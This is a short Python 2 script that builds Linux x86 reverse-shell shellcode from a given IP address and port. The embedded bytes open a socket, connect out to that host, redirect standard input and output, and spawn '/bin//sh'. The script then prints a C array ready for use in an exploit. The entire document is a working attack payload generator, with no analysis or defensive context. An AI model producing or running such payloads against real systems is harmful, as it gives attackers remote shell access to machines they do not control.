#!/usr/bin/python

import socket, sys, struct

if len(sys.argv) is not 3:
    print "Usage: {0} IP PORT".format(sys.argv[0])
    exit()

ip = socket.inet_aton(sys.argv[1])
port = int(sys.argv[2])

if port < 1 or port > 65535:
    print "[!] Wrong port no."
    exit()

ip = ip.encode('hex')
port = format(port, '04x')

print "[+] IP = " + ip
print "[+] PORT = " + port

shellcode = "\\x31\\xdb\\x53\\x6a\\x01\\x6a\\x02\\x43\\x89\\xe1\\x6a\\x66\\x58\\x99\\xcd\\x80\\x96\\x68\\x" + ip[0:2] + "\\x" + ip[2:4] + "\\x" + ip[4:6] + "\\x" + ip[6:8] + "\\x66\\x68\\x" + str(port[0:2]) + "\\x" + str(port[2:4]) + "\\x43\\x66\\x53\\x89\\xe1\\x6a\\x10\\x51\\x56\\x89\\xe1\\x43\\x6a\\x66\\x58\\xcd\\x80\\x89\\xf3\\x31\\xc9\\xb0\\x3f\\xcd\\x80\\x41\\x80\\xf9\\x03\\x75\\xf6\\x52\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x52\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80"

print "[+] Shellcode length = " + str(len(shellcode)/4)
print "unsigned char code[] = \"" + shellcode + "\";"
